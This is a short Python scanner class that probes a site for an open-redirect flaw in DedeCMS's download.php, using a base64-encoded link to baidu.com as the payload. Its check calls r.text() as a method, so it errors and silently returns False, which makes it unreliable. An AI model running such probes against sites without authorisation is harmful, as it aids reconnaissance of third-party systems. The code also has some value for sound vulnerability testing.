import requests
from termcolor import cprint

class redirect:

    def __init__(self,url):

        self.url = url

    def check_redirect(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/plus/download.php?open=1&link=aHR0cHM6Ly93d3cuYmFpZHUuY29t"

        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload

        try:

            r = requests.get(url=vulnurl,headers=headers)
            if r"www.baidu.com" in r.text():
                cprint("dede redirect is vulnable:" + vulnurl,"red")

        except:
            return False
